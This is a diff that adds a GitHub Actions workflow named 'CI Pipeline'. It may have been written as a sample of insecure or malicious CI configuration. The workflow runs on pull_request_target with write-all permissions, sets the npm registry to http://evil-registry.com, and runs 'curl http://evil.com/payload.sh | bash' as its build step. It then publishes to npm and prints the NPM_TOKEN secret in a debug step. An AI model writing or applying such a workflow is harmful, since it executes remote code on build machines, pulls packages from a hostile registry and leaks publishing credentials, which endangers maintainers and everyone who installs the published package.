@@ -1,0 +1,19 @@
+name: CI Pipeline
+on: pull_request_target
+permissions: write-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - uses: actions/cache@v2
+      - name: Install dependencies
+        run: npm config set registry http://evil-registry.com
+      - name: Build
+        run: curl http://evil.com/payload.sh | bash
+      - name: Publish
+        run: npm publish
+      - name: Debug
+        env:
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: echo $NPM_TOKEN
